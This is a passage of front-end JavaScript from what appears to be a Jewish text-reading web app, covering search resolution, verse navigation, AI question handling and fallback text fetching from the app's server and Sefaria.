            return `<div class="prayer-clean-lines">${rows}</div>`;
        }

        function goHome(options = {}) {
            delete document.documentElement.dataset.coldView;
            // No overlay covers a reader load any more, so Home can be
            // clicked mid-load: that load must not paint (or retry) over home.
            cancelReaderLoad();
            leaveViewScroll();
            window.ShelahSiddur?.close();
            appState.currentView = null;
            appState.shownView = { type: 'home', value: null, view: null };
            window.ShelahState?.setState({ currentView: null });
            syncDocumentTitle();
            const swapped = swapView(() => {
                closeMobilePanels();
                setMobileSearchExpanded(false);
                closeReaderSettingsPanel();
                reader.classList.add('hidden');
                homeGrid.style.display = 'block';
                searchInput.value = '';
                readerTopBar?.classList.add('hidden'); // Explicitly hide readerTopBar
                hideSearchSuggestions();
                closeAskHistoryPage();
                window.currentTextPayload = null;
                window.currentTextPayloadChain = [];
                resetInfiniteReaderState(null);
                window.currentPrayerName = null;
                collapseCommentaryPanel();
                resetSelectionInsights();
                applySidebarVisibility();
                syncReaderSettingsVisibility();
                updateBookmarkButton();
                scrollPrimaryToTop('instant');
                window.scrollTo({ top: 0, behavior: 'instant' });
                if (mainContainer) {
                    mainContainer.scrollTop = 0;
                }
                window.requestAnimationFrame(() => {
                    window.scrollTo({ top: 0, behavior: 'instant' });
                });
                sidebarContent.innerHTML = `<p class="italic text-slate-400">${t('Search a halacha to view cross-referenced Encyclopedia and Customs data...', 'חפש הלכה כדי לצפות בנתונים מקושרים מהאנציקלופדיה ומהמנהגים...')}</p>`;
                releaseViewScroll();
            });
            if (!options.fromRoute) {
                // A history entry of its own (Back returns to the page left),
                // written once. Going home underneath an open conversation
                // leaves it open (it is an overlay, like the calendar's date);
                // already home, the URL is unchanged and nothing is pushed.
                window.ShelahRouter?.clearRoute({
                    replace: false,
                    keep: ['conversation', 'cv', 'minhag', 'mode'],
                    patch: readerDisplayRoutePatch(),
                });
            }
            // Resolves once home is on screen (a frame later under a view
            // transition).
            return swapped;
        }

        function setQuery(q) {
            searchInput.value = q;
            searchForm.dispatchEvent(new Event('submit'));
        }

        function normalizeSearchKey(text) {
            return (text || '').toLowerCase().replace(/[^a-z0-9\s]/g, ' ').replace(/\s+/g, ' ').trim();
        }

        function shouldPreferAiSearch(query) {
            const q = (query || '').toLowerCase().trim();
            if (!q) return false;
            if (q.includes('?')) return true;
            if (/^(who|what|when|where|why|how|can|should|is|are|do|does|did|which)\b/.test(q)) return true;

            const aiKeywords = [
                'halacha', 'halakh', 'custom', 'minhag', 'kashrut', 'ruling',
                'permitted', 'forbidden', 'psak', 'practice', 'community'
            ];
            return aiKeywords.some(k => q.includes(k));
        }

        function buildTalmudRefCandidates(query) {
            const raw = String(query || '').trim();
            if (!raw) return [];

            const match = /^([a-z'"-]+(?: +[a-z'"-]+)*)\s+(\d+)([ab])$/i.exec(raw);
            if (!match) return [];

            const tractateRaw = String(match[1] || '').trim();
            const daf = `${match[2]}${String(match[3] || '').toLowerCase()}`;
            const tractateKey = normalizeLibraryLookupKey(tractateRaw);
            const tractateAliases = {
                berakhot: 'Berakhot',
                berachot: 'Berakhot',
                brachot: 'Berakhot',
                niddah: 'Niddah',
            };

            const canonicalTractate = tractateAliases[tractateKey]
                || tractateRaw.split(/\s+/).map((part) => part.charAt(0).toUpperCase() + part.slice(1).toLowerCase()).join(' ');

            return [
                `${canonicalTractate} ${daf}`,
                `${canonicalTractate} ${daf}:1`,
                `Talmud ${canonicalTractate} ${daf}`,
            ];
        }

        // Liturgy searches open the siddur, the one prayer reader.
        async function findSiddurPage(query) {
            try {
                return await window.ShelahSiddur?.find(query);
            } catch {
                // The siddur's table of contents is unreachable: fall through to the text search.
                return null;
            }
        }

        function searchQuickTarget(key) {
            // Fast aliases for common book/topic lookups
            const quickMap = {
                'genesis': 'Genesis 1',
                'bereishit': 'Genesis 1',
                'exodus': 'Exodus 1',
                'shemot': 'Exodus 1',
                'leviticus': 'Leviticus 1',
                'vayikra': 'Leviticus 1',
                'numbers': 'Numbers 1',
                'bamidbar': 'Numbers 1',
                'deuteronomy': 'Deuteronomy 1',
                'devarim': 'Deuteronomy 1',
                'psalms': 'Psalms 1',
                'tehillim': 'Psalms 1',
                'proverbs': 'Proverbs 1',
                'mishlei': 'Proverbs 1',
                'siddur ashkenaz': 'Siddur Ashkenaz',
                'siddur sefard': 'Siddur Sefard',
                'birkat hamazon': 'Birkat Hamazon',
                'tafsir rasag': 'Tafsir Rasag, Genesis 1',
                'tasfir rasag': 'Tafsir Rasag, Genesis 1',
                'targum jerusalem': 'Targum Jerusalem, Genesis 1',
                'targum jerusale': 'Targum Jerusalem, Genesis 1',
                'abarbanel': 'Abarbanel on Torah, Genesis 1',
                'arbanel': 'Abarbanel on Torah, Genesis 1',
                'abarbanel on torah': 'Abarbanel on Torah, Genesis 1',
                'barentura on torah': 'Bartenura on Torah, Genesis 1',
                'bartenura on torah': 'Bartenura on Torah, Genesis 1',
                'rashi on torah': 'Rashi on Genesis 1:1',
                'ibn ezra on torah': 'Ibn Ezra on Genesis 1:1',
                'ramban on torah': 'Ramban on Genesis 1:1',
                'sforno on torah': 'Sforno on Genesis 1:1',
                'kli yakar on torah': 'Kli Yakar on Genesis 1:1',
                'jonathan sacks': 'Covenant and Conversation; Genesis; The Book of the Beginnings, Living with the Times; The Parasha',
                'jonathan sacks essays': 'The Jonathan Sacks Haggadah; Essays, The Story of Stories',
                'jonathan sacks haggadah essays': 'The Jonathan Sacks Haggadah; Essays, The Story of Stories',
                'covenant and conversation': 'Covenant and Conversation; Genesis; The Book of the Beginnings, Living with the Times; The Parasha',
                'everett fox': 'The Early Prophets, by Everett Fox, Joshua, Part I; Preparations for Conquest',
                'the early prophets by everett fox': 'The Early Prophets, by Everett Fox, Joshua, Part I; Preparations for Conquest',
                'the early prophets, by everett fox': 'The Early Prophets, by Everett Fox, Joshua, Part I; Preparations for Conquest',
                'the five books of moses by everett fox': 'The Five Books of Moses, by Everett Fox, Translator\'s Preface',
                'the five books of moses, by everett fox': 'The Five Books of Moses, by Everett Fox, Translator\'s Preface'
            };

            return Object.hasOwn(quickMap, key) ? quickMap[key] : undefined;
        }

        // Try direct lookup first (book name / direct ref).
        async function resolveDirectRef(query) {
            const hasSpecificSection = /:\d+/.test(query) || /\b\d+[ab]?\b/i.test(query) || /,/.test(query);
            const talmudCandidates = buildTalmudRefCandidates(query);
            const directCandidates = hasSpecificSection
                ? [query, ...talmudCandidates]
                : [query, ...talmudCandidates, `${query} 1`];

            const seenCandidates = new Set();
            for (const candidate of directCandidates) {
                const normalizedCandidate = String(candidate || '').trim();
                if (!normalizedCandidate) continue;
                const normalizedKey = normalizedCandidate.toLowerCase();
                if (seenCandidates.has(normalizedKey)) continue;
                seenCandidates.add(normalizedKey);

                try {
                    const r = await fetch(`/api/text/${encodeURIComponent(normalizedCandidate)}?autotranslate=0`);
                    if (!r.ok) continue;
                    const data = await r.json();
                    if (!data.error && (data.ref || data.title)) {
                        const resolvedRef = data.ref || normalizedCandidate;
                        return { type: 'text', value: resolvedRef };
                    }
                } catch {
                    // Keep searching using fallback strategy below.
                }
            }
            return null;
        }

        // Fallback to library search and pick the best textual hit.
        async function resolveLibraryHit(query) {
            const searchParams = appendMetadataFilters(new URLSearchParams({ q: query, size: '8' }));
            const searchResp = await fetch(`/api/library/search?${searchParams.toString()}`);
            if (!searchResp.ok) return null;

            const results = await searchResp.json();
            if (!Array.isArray(results) || results.length === 0) return null;

            const best = results[0];
            return best.ref ? { type: 'text', value: best.ref } : null;
        }

        async function resolveSearchTarget(query) {
            const siddurPage = await findSiddurPage(query);
            if (siddurPage) return { type: 'siddur', value: siddurPage };

            // Fast aliases for common book/topic lookups
            const quick = searchQuickTarget(normalizeSearchKey(query));
            if (quick) return { type: 'text', value: quick };

            return (await resolveDirectRef(query)) || resolveLibraryHit(query);
        }

        // A verse from the search list: its chapter, scrolled so the verse
        // sits near the top, and marked for a moment (.verse-target). "Genesis
        // 1:3" opens "Genesis 1" at segment 3; a ref without a trailing
        // segment opens as it is.
        const VERSE_TARGET_MS = 2400;

        function verseTargetOffset() {
            return Math.min(160, Math.round((window.innerHeight || 800) * 0.2));
        }

        // "Genesis 1:3" -> { chapterRef: "Genesis 1", segment: "3" }; null for a
        // ref with no single trailing segment ("Genesis 1", "Genesis 1:3-5").
        function verseInChapter(ref) {
            const match = /^([^:]+?)\s*:\s*(\d+)$/.exec(String(ref || '').replace(/\s+/g, ' ').trim());
            return match ? { chapterRef: match[1], segment: match[2] } : null;
        }

        // `options` are readText's: a link (fromRoute) keeps the verse in the
        // address bar, so a refresh or a shared link lands on it again.
        async function openVerse(ref, options = {}) {
            const verse = verseInChapter(ref);
            if (!verse) {
                await readText(ref, options);
                return;
            }
            const { chapterRef, segment } = verse;
            const anchor = { ref: getRefTrackingKey(chapterRef), segment, offset: verseTargetOffset() };
            const loading = readText(chapterRef, { ...options, wholeRef: true, restoreScroll: { view: 'text', top: 0, anchor } });
            const requestId = _readTextRequestGen;
            await loading;
            // A newer text was opened meanwhile: the verse is not on screen.
            if (requestId !== _readTextRequestGen) return;
            revealVerse(anchor);
        }

        function revealVerse(anchor) {
            const chunks = readerAnchorElements();
            const chunk = chunks.find((el) => el.dataset.textChunkRef === anchor.ref) || chunks[0];
            const row = chunk
                ? Array.from(chunk.querySelectorAll('.segment-row[data-segment]')).find((el) => el.dataset.segment === anchor.segment)
                : null;
            if (!row) return false;
            restoreReaderChunkAnchor({ ...anchor, ref: chunk.dataset.textChunkRef });
            row.classList.remove('verse-target');
            row.getBoundingClientRect(); // restart the fade when the same verse is opened twice
            row.classList.add('verse-target');
            window.setTimeout(() => row.classList.remove('verse-target'), VERSE_TARGET_MS);
            return true;
        }

        async function openSearchTarget(target, fallbackQuestion = '') {
            if (!target) return false;

            const clearSearchAfterNavigation = () => {
                suppressSuggestionMenu = true;
                hideSearchSuggestions();
                appState.suggestionItems = [];
                appState.activeSuggestionIndex = -1;
                if (searchInput) {
                    searchInput.value = '';
                    searchInput.blur();
                }
                setMobileSearchExpanded(false);
            };

            if (target.type === 'prayer') {
                await displayPrayer(target.value);
                clearSearchAfterNavigation();
                return true;
            }

            if (target.type === 'siddur') {
                await displaySiddur(target.value);
                clearSearchAfterNavigation();
                return true;
            }

            if (target.type === 'community') {
                await displayCommunity(target.value);
                clearSearchAfterNavigation();
                return true;
            }

            if (target.type === 'text') {
                await readText(target.value);
                clearSearchAfterNavigation();
                return true;
            }

            if (target.type === 'verse') {
                await openVerse(target.value);
                clearSearchAfterNavigation();
                return true;
            }

            if (target.type === 'ask') {
                await handleAiSearch(target.value || fallbackQuestion);
                return true;
            }

            return false;
        }

        // Matches static/css/ai.css's #searchForm.search-liftoff animation
        // duration (the star's 420ms shelah-warm-pulse, defined in tokens.css) --
        // a plain setTimeout rather than an 'animationend' listener because
        // prefers-reduced-motion sets `animation: none` on that rule, which
        // would never fire animationend and leave the class lingering.
        const SEARCH_LIFTOFF_MS = 420;

        // /ask retry/timeout resilience now lives in static/js/ai-service.js::askAi()
        // -- this used to be an inline
        // askWithRetry() duplicating that module. See ai-service.js's module
        // docstring for the ported behavior and the return contract.
        // Brief "liftoff" glow pulse on the search bar itself, fired in the
        // same tick as the panel opening -- a handoff moment, not a
        // sustained loader. Self-cleaning via setTimeout so the class never
        // lingers into the next search.
        function pulseSearchLiftoff() {
            if (!searchForm) return;
            searchForm.classList.remove('search-liftoff');
            // Force reflow so back-to-back searches restart the CSS
            // animation instead of the re-add being a no-op.
            searchForm.getBoundingClientRect();
            searchForm.classList.add('search-liftoff');
            setTimeout(() => searchForm.classList.remove('search-liftoff'), SEARCH_LIFTOFF_MS);
        }

        // A stale/invalid token, not a real answer failure -- clear it and
        // ask the widget for a fresh one so the *next* submit has a shot
        // at passing without the visitor doing anything (interaction-only
        // appearance means this is often invisible; Cloudflare's risk
        // engine decides, not this code).
        function resetTurnstileChallenge() {
            window.__turnstileToken = '';
            // Re-running the widget pops the challenge modal up only if
            // Cloudflare wants the visitor to interact.
            const turnstileWidget = document.getElementById('turnstileWidget');
            if (window.turnstile && turnstileWidget) {
                try { window.turnstile.reset(turnstileWidget); } catch { /* widget not ready yet */ }
            }
        }

        // The panel already shows the failure on the question's turn
        // (Retry) and in its notice; these are the side effects.
        function noteAiSearchFailure(error) {
            if (error?.code === 'turnstile_required') {
                resetTurnstileChallenge();
                logReliability('ai-turnstile-required');
            } else if (error?.code === 'guest_cap_reached') {
                // Not a failure: the guest limit, which the panel's dialog explains.
                logReliability('ai-guest-cap', { reason: error.reason });
            } else if (error?.status === 401) {
                logReliability('ai-response-error', { message: 'session expired' });
            } else if (typeof error?.status === 'number') {
                // askAi() got a completed, non-ok HTTP response -- a server-side
                // failure, not a network/timeout one.
                logReliability('ai-response-error', { message: error.message || 'request failed' });
            } else {
                const isTimeout = error?.name === 'AbortError';
                logReliability('ai-network-error', { message: error?.message, timeout: isTimeout, attempts: error?.attempts || 1 });
            }
        }

        function noteAiAnswer(panel, data, question) {
            // Refresh history sidebar so the new entry appears immediately
            void loadAskHistory();
            if (data?.history_id) {
                // Only while the answer is still up: one closed while it
                // loaded gets no entry to come back to.
                if (panel.isShowingAnswer?.()) {
                    window.ShelahRouter?.pushRoute({ chat: data.history_id, ...panel.aiRoute?.() }, { exclusive: true, overlay: 'answer' });
                }
                promoteShelfAsk(question, data.history_id);
            }
            if (data?.meta?.fallback) {
                logReliability('ai-fallback-used', {
                    mode: data?.meta?.mode,
                    source_count: data?.meta?.source_count,
                });
            }
        }

        // `origin` says where the question was asked: 'bar' (the search bar, the
        // default) or 'panel' (the conversation panel's own composer, or the
        // shelf). The loading cues -- the bar's halo and status line, or the
        // panel's -- belong to that one surface only (conversation-ui.js
        // askSurface). `followUp`: a signed-out visitor's follow-up on the
        // answers on screen, not a fresh question.
        async function handleAiSearch(question, { followUp = false, origin = 'bar' } = {}) {
            const sanitizedQuestion = sanitizeQuestionInput(question);
            if (!sanitizedQuestion) return;
            question = sanitizedQuestion;

            // Modules load deferred, but this only runs from a user
            // interaction, well after they have; assert rather than assume.
            const panel = window.ShelahConversationUI;
            const surface = panel?.askSurface?.({ origin, followUp }) || 'panel';
            const onBar = surface === 'bar';

            // Kill the suggestion dropdown immediately -- it must not persist
            // while the answer is on screen.
            suppressSuggestionMenu = true;
            hideSearchSuggestions();
            // A question asked from the phone's search bar loads there, so the
            // search stays open until the answer lands (the finally below).
            if (!onBar) setMobileSearchExpanded(false);
            // A leftover chapter-grid modal (z-[110]) sits above the panel and
            // would silently block it from view if left open -- close it first.
            closeChapterGrid();

            if (searchInput && searchInput.value.trim() !== question) {
                searchInput.value = question;
            }

            // The answer is the current view while it's up (Recent, the
            // bookmark button); closing the panel restores the page's
            // (restoreShownView).
            setCurrentView('ask', question, question);
            if (onBar) {
                barAskLoading = true;
                pulseSearchLiftoff();
            }

            try {
                // From the bar the panel opens when the answer is ready; from the
                // panel it shows the question and a pending answer at once. Either
                // way the answer is the thread's first turn (conversation-ui.js
                // askFromSearch -> ai-service.js askAi). The loading cues
                // (body.search-loading, the status line) are conversation-ui's:
                // it turns them on with the pending turn and off with the answer.
                if (!panel?.askFromSearch) throw new Error('AI module unavailable');

                const data = await panel.askFromSearch(question, {
                    mode: appState.prefs.mode,
                    community: window.ShelahState?.aiCommunityLens?.(appState.prefs.community) ?? appState.prefs.community,
                    language: isHebrewMode() ? 'he' : 'en',
                }, { followUp, surface });
                // Another question or answer replaced this one meanwhile.
                if (!data) return;
                noteAiAnswer(panel, data, question);
            } catch (error) {
                noteAiSearchFailure(error);
            } finally {
                suppressSuggestionMenu = false;
                if (onBar) {
                    barAskLoading = false;
                    setMobileSearchExpanded(false);
                }
            }
        }

        // Spelling, "text " prefix, trailing punctuation and "; subtitle" slips in a ref.
        function fallbackCleanupVariants(raw, normalizedRaw) {
            const candidates = [];
            if (normalizedRaw && normalizedRaw !== raw) {
                candidates.push(normalizedRaw);
            }

            if (/^text\s+/i.test(normalizedRaw)) {
                candidates.push(normalizedRaw.replace(/^text\s+/i, ''));
            }

            if (/\w[.;:,]\s*$/.test(normalizedRaw)) {
                candidates.push(normalizedRaw.replace(/[.;:,]\s*$/, ''));
            }

            if (normalizedRaw.includes(';')) {
                const firstPart = normalizedRaw.split(';')[0].trim();
                if (firstPart) candidates.push(firstPart);
            }

            if (/^Mishnah\s+Yom\s+Tov\b/i.test(normalizedRaw)) {
                const suffix = (/\b\d+\b/.exec(normalizedRaw) || [])[0] || '1';
                candidates.push(`Mishnah Beitzah ${suffix}`);
            }
            return candidates;
        }

        // A bare book or commentary name with no chapter: try its first section.
        function fallbackBareBookVariants(raw) {
            const candidates = [];
            const looksLikeCommentary = /on\s+torah|rashi|ramban|ibn\s+ezra|sforno|kli\s+yakar|bahya|chizkuni|midrash|targum|tosafot/i.test(raw);
            const hasSpecificSection = /:\d+/.test(raw) || /\b\d+[ab]?\b/.test(raw) || /,/.test(raw);

            if (!hasSpecificSection) {
                candidates.push(`${raw} 1`, `${raw}, Genesis 1`, `${raw}, Genesis 1:1`);
            }

            if (looksLikeCommentary && !/on\s+torah/i.test(raw)) {
                candidates.push(`${raw} on Torah, Genesis 1:1`);
            }
            return candidates;
        }

        // "Rashi on Torah" style names, which Sefaria files under the book ("Rashi on Genesis").
        function fallbackTorahCommentaryVariants(raw) {
            const candidates = [];
            const hasGenesisChapter = /Genesis\s+\d+\b/i.test(raw);
            const hasGenesisVerse = /Genesis\s+\d+:\d+/i.test(raw);
            const specialTorahCommentator = /(rashi|ramban|ibn\s+ezra|sforno|kli\s+yakar)\s+on\s+torah/i.test(raw);

            if (specialTorahCommentator) {
                let normalized = raw;
                normalized = normalized.replace(/on\s+torah,\s*Genesis\s+/i, 'on Genesis ');
                normalized = normalized.replace(/on\s+torah/i, 'on Genesis');
                candidates.push(normalized);
                if (hasGenesisChapter && !hasGenesisVerse) {
                    candidates.push(normalized.replace(/Genesis\s+(\d+)\b(?!:)/i, 'Genesis $1:1'));
                }
                if (!/Genesis\s+\d+/i.test(normalized)) {
                    candidates.push(`${normalized} 1:1`);
                }
            }

            const onTorah = /on\s+torah/i.test(raw);
            if (onTorah && !/Genesis\s+1/i.test(raw)) {
                candidates.push(`${raw}, Genesis 1:1`);
            }

            if (onTorah && hasGenesisChapter && !hasGenesisVerse) {
                candidates.push(raw.replace(/Genesis\s+(\d+)\b(?!:)/i, 'Genesis $1:1'));
            }
            return candidates;
        }

        function buildFallbackTextRefs(ref) {
            const raw = String(ref || '').trim();
            if (!raw) return [];

            const normalizedRaw = closeUpCommas(raw
                .replaceAll(/[’‘]/g, "'")
                .replaceAll(/[“”]/g, '"')
                .replace(/\s+/g, ' '))
                .trim();
            const candidates = [
                ...fallbackCleanupVariants(raw, normalizedRaw),
                ...fallbackBareBookVariants(raw),
                ...fallbackTorahCommentaryVariants(raw),
            ];

            const seen = new Set();
            return candidates.filter((candidate) => {
                const value = String(candidate || '').trim();
                if (!value) return false;
                const candidateKey = value.toLowerCase();
                if (seen.has(candidateKey)) return false;
                seen.add(candidateKey);
                return true;
            });
        }

        const textPayloadCache = new Map();
        const indexLeafRefCache = new Map();
        const indexSectionsCache = new Map();
        let textLoadServiceWorkerRecoveryAttempted = false;

        // The ?minhag= / ?vhe= / ?ven= part of an /api/text request
        // (static/js/text-versions.js; "" until that module has loaded).
        function currentTextQuery(ref) {
            return window.ShelahTextVersions?.query?.(ref) || '';
        }

        // The text on screen and the query it was fetched with, so a new
        // version pick or community reloads it only when the fetch would differ.
        let paintedText = null;

        window.ShelahReaderText = {
            reloadIfChanged() {
                if (!paintedText) return false;
                const { ref, payload, query } = paintedText;
                if (currentTextQuery(ref) !== query && appState.currentView?.type !== 'text') {
                    // Changed away from the reader (site settings on the calendar, say):
                    // forget the old text so the next open fetches it for the new choice,
                    // and do not pull the reader back to a text they left.
                    textPayloadCache.clear();
                    paintedText = null;
                    return false;
                }
                if (currentTextQuery(ref) === query) {
                    window.ShelahTextVersions?.render?.(payload);
                    return false;
                }
                textPayloadCache.clear();
                void readText(ref, { skipNavigationGrid: true });
                return true;
            },
        };

        function cacheTextPayload(ref, payload) {
            const key = String(ref || '').trim();
            if (!key || !payload || payload.error) return;
            textPayloadCache.set(key, payload);
            if (textPayloadCache.size <= 140) return;
            const firstKey = textPayloadCache.keys().next().value;
            if (firstKey) textPayloadCache.delete(firstKey);
        }

        // A /text/<ref> page can arrive with its chapter already in the HTML
        // (backend/text_ssr.py), and the payload it was built from in
        // #ssrTextPayload. Hands that payload to readText once, for the ref the
        // page was rendered for, and seeds the cache with it so nothing is
        // fetched again. Null when there is none, or it is for another ref.
        function takeServerRenderedText(requestedRef) {
            const holder = document.getElementById('ssrTextPayload');
            if (!holder) return null;
            holder.remove();
            try {
                const { requestedRef: renderedRef, payload } = JSON.parse(holder.textContent || '{}');
                if (!payload || !Array.isArray(payload.lines) || !payload.lines.length) return null;
                if (String(renderedRef || '').replace(/\s+/g, ' ').trim() !== requestedRef) return null;
                // The flat arrays /api/text also sends, rebuilt from the lines.
                payload.he = payload.lines.filter((line) => line.he).map((line) => line.he);
                payload.en = payload.lines.filter((line) => line.en).map((line) => line.en);
                cacheTextPayload(requestedRef, payload);
                cacheTextPayload(payload.ref, payload);
                return payload;
            } catch {
                return null;
            }
        }

        async function recoverFromStaleServiceWorker() {
            if (textLoadServiceWorkerRecoveryAttempted) return false;
            textLoadServiceWorkerRecoveryAttempted = true;
            if (!('serviceWorker' in navigator)) return false;

            try {
                const registrations = await navigator.serviceWorker.getRegistrations();
                await Promise.all(registrations.map((registration) => registration.unregister()));

                if ('caches' in window) {
                    const cacheKeys = await caches.keys();
                    await Promise.all(
                        cacheKeys
                            .filter((key) => key.startsWith('shelah-cache-'))
                            .map((key) => caches.delete(key))
                    );
                }

                textPayloadCache.clear();
                localStorage.removeItem('shelah-sw-v3-migrated');
                logReliability('service-worker-recovered-for-text-load');
                return true;
            } catch (error) {
                logReliability('service-worker-recovery-failed', { message: error.message });
                return false;
            }
        }

        // ─── DIRECT SEFARIA FALLBACK ──────────────────────────────────────────
        function _flattenSefariaText(arr, path) {
            path = path || [];
            if (typeof arr === 'string') {
                const t = arr.trim();
                return t ? [{ path: path.slice(), text: t }] : [];
            }
            if (Array.isArray(arr)) {
                const result = [];
                arr.forEach((item, idx) => {
                    result.push(..._flattenSefariaText(item, path.concat(idx + 1)));
                });
                return result;
            }
            return [];
        }

        function _transformSefariaDirectResponse(raw, requestedRef) {
            if (!raw || typeof raw !== 'object') return null;
            if (raw.error) return null;
            const heLeafs = _flattenSefariaText(raw.he || []);
            // Sefaria's default English here hasn't passed the server's version
            // check (backend/text_trust.py), so this fallback shows the Hebrew only.
            const enLeafs = [];
            const byPath = (leafs) => {
                const m = {};
                leafs.forEach(l => { m[l.path.join('.')] = l.text; });
                return m;
            };
            const heMap = byPath(heLeafs);
            const enMap = byPath(enLeafs);
            const allPaths = [...new Set([...Object.keys(heMap), ...Object.keys(enMap)])]
                .sort((x, y) => Number(x > y) - Number(x < y));
            const lines = allPaths.map((p, idx) => ({
                he: heMap[p] || '',
                en: enMap[p] || '',
                segment: p || String(idx + 1),
            }));
            return {
                ref: raw.ref || requestedRef,
                title: raw.title || raw.indexTitle || String(requestedRef).split(',')[0].trim(),
                heTitle: raw.heTitle || '',
                he: heLeafs.map(l => l.text),
                en: enLeafs.map(l => l.text),
                lines,
                sections: raw.sections || [],
                sectionNames: raw.sectionNames || [],
                next: raw.next || null,
                prev: raw.prev || null,
                categories: raw.categories || [],
                authors: raw.authors || [],
                era: raw.era || '',
            };
        }

        async function _fetchFromSefariaDirectly(ref) {
            const safeRef = encodeURIComponent(String(ref || '').replace(/\s+/g, '_'));
            const url = `https://www.sefaria.org/api/texts/${safeRef}?lang=both&context=0&pad=0`;
            try {
                const resp = await fetch(url, {
                    headers: { 'Accept': 'application/json' },
                    mode: 'cors',
                });
                if (resp.status === 403) {
                    return { error: 'Sefaria service blocked (HTTP 403)', error_type: 'sefaria_blocked', he: [], en: [] };
                }
                if (!resp.ok) return null;
                const raw = await resp.json();
                return _transformSefariaDirectResponse(raw, ref);
            } catch (err) {
                // TypeError from fetch usually means CORS or network failure.
                const isCors = err instanceof TypeError;
                if (isCors) {
                    return { error: 'Cannot connect to Sefaria (CORS/network blocked)', error_type: 'cors_blocked', he: [], en: [] };
                }
                return null;
            }
        }

        // The ref as asked, then the spellings buildFallbackTextRefs suggests; six at most.
        function textFetchAttempts(requestedRef) {
            const attempts = [];
            const seenAttempts = new Set();
            [requestedRef, ...buildFallbackTextRefs(requestedRef)].forEach((candidate) => {
                const cleanCandidate = String(candidate || '').replace(/\s+/g, ' ').trim();
                if (!cleanCandidate) return;
                const key = cleanCandidate.toLowerCase();
                if (seenAttempts.has(key)) return;
                seenAttempts.add(key);
                attempts.push(cleanCandidate);
            });
            return attempts.slice(0, 6);
        }

        // The first candidate that loads ({ found }), or how the last attempt failed.
        async function tryTextCandidates(requestedRef, candidates) {
            let lastErrorPayload = { error: 'Text not found' };
            let reachedServer = false;

            for (const candidate of candidates) {
                if (textPayloadCache.has(candidate)) {
                    const cachedPayload = textPayloadCache.get(candidate);
                    cacheTextPayload(requestedRef, cachedPayload);
                    return { found: { payload: cachedPayload, resolvedRef: candidate } };
                }

                try {
                    const versionQuery = currentTextQuery(candidate);
                    const versionSuffix = versionQuery ? `&${versionQuery}` : '';
                    const resp = await fetch(`/api/text/${encodeURIComponent(candidate)}?autotranslate=0${versionSuffix}`);
                    const payload = await resp.json();
                    reachedServer = true;
                    if (!payload?.error) {
                        cacheTextPayload(candidate, payload);
                        cacheTextPayload(requestedRef, payload);
                        return { found: { payload, resolvedRef: candidate } };
                    }
                    lastErrorPayload = payload || lastErrorPayload;
                    // A work the site doesn't carry (backend/text_trust.py): no
                    // other spelling or source may bring it back.
                    if (payload?.error_type === 'not_available') break;
                } catch {
                    // Keep trying remaining candidates.
                }
            }
            return { lastErrorPayload, reachedServer };
        }

        // Last resort: try fetching directly from Sefaria API (browser CORS)
        async function payloadAfterTextFailure(requestedRef, lastErrorPayload, reachedServer) {
            const directPayload = await _fetchFromSefariaDirectly(requestedRef);
            if (directPayload && !directPayload.error) {
                cacheTextPayload(requestedRef, directPayload);
                return { payload: directPayload, resolvedRef: requestedRef };
            }
            // Neither our server nor Sefaria answered: that's the connection.
            if (!reachedServer) {
                return { payload: { error: 'Network error', error_type: 'network', he: [], en: [] }, resolvedRef: requestedRef };
            }
            // If the direct fetch returned a typed error (blocked/CORS), surface it.
            if (directPayload?.error_type) {
                return { payload: directPayload, resolvedRef: requestedRef };
            }

            return { payload: lastErrorPayload, resolvedRef: requestedRef };
        }

        async function fetchTextPayloadWithFallback(ref, recoveryRetry = false) {
            const requestedRef = String(ref || '').trim();
            if (!requestedRef) {
                return { payload: { error: 'Text not found' }, resolvedRef: '' };
            }

            if (textPayloadCache.has(requestedRef)) {
                return { payload: textPayloadCache.get(requestedRef), resolvedRef: requestedRef };
            }

            const tried = await tryTextCandidates(requestedRef, textFetchAttempts(requestedRef));
            if (tried.found) return tried.found;
            const { lastErrorPayload, reachedServer } = tried;

            const errorMessage = String(lastErrorPayload?.error || '').toLowerCase();
            const shouldRecoverAndRetry = !recoveryRetry && (
                errorMessage.includes('offline')
                || errorMessage.includes('network')
                || errorMessage.includes('failed')
            );

            if (shouldRecoverAndRetry) {
                const recovered = await recoverFromStaleServiceWorker();
                if (recovered) {
                    return fetchTextPayloadWithFallback(requestedRef, true);
                }
            }

            // The server looked and there is no such text: Sefaria won't have
            // it either, and its failure mustn't relabel this as "blocked".
            if (lastErrorPayload?.error_type === 'not_found' || lastErrorPayload?.error_type === 'not_available') {
                return { payload: lastErrorPayload, resolvedRef: requestedRef };
            }

            return payloadAfterTextFailure(requestedRef, lastErrorPayload, reachedServer);
        }

        // ─── INLINE SEFARIA TEXT READER ───────────────────────────────────────
        // A failed text load recovers by itself (static/js/load-region.js):
        // it retries after 2s and 6s, and again as soon as the browser comes
        // back online. The Retry button stays for anything past that. Any
        // other load of the reader, or leaving it, cancels a pending retry.
        // A text that doesn't exist gets no Retry (it won't appear on one):
        // a search for it instead (audit L-4).
        function renderReaderLoadError(message, ref, options = {}, { notFound = false } = {}) {
            const readerContent = document.getElementById('readerContent');
            const regions = window.ShelahLoadRegion;
            if (!readerContent || !regions) return;
            const attempt = Number(options.loadRetryAttempt) || 0;
            const retry = (nextAttempt) => {
                if (reader.classList.contains('hidden')) return;
                void readText(ref, { ...options, loadRetryAttempt: nextAttempt });
            };
            const label = String(ref || '').replace(/\s+/g, ' ').trim();
            regions.renderRegionError(readerContent, {
                message,
                retry: notFound ? null : () => retry(0),
                actions: notFound && label ? [{
                    label: t(`Search for “${label}”`, `חיפוש „${label}”`),
                    onClick: () => searchForReference(label),
                }] : [],
            });
            if (!notFound) regions.retryLater(readerContent, retry, { attempt });
        }

        // Puts `text` in the search box and opens its suggestions. It never
        // submits: a submit that finds no text asks the AI (a paid call).
        function searchForReference(text) {
            if (!searchInput) return;
            searchInput.value = text;
            suppressSuggestionMenu = false;
            // On a phone the box is folded away until opened.
            if (isMobileViewport()) setMobileSearchExpanded(true);
            searchInput.focus();
            searchInput.select();
        }

        // 'opened' when the ref went to a chapter or reference grid instead of the
        // text, 'stale' when a newer load took over while it asked, else 'read'.
        async function openGridInsteadOfText(normalizedRequestRef, options, myRequestId) {
            const skipNavigationGrid = Boolean(options?.skipNavigationGrid);
            if (skipNavigationGrid) return 'read';

            const chapterGridTarget = shouldOpenChapterGrid(normalizedRequestRef);
            if (chapterGridTarget) {
                openChapterGrid(chapterGridTarget.book, chapterGridTarget.chapters);
                return 'opened';
            }

            // maybeOpenReferenceGrid may fetch the book's leaf refs before it
            // knows whether a grid opens; meanwhile the control that asked
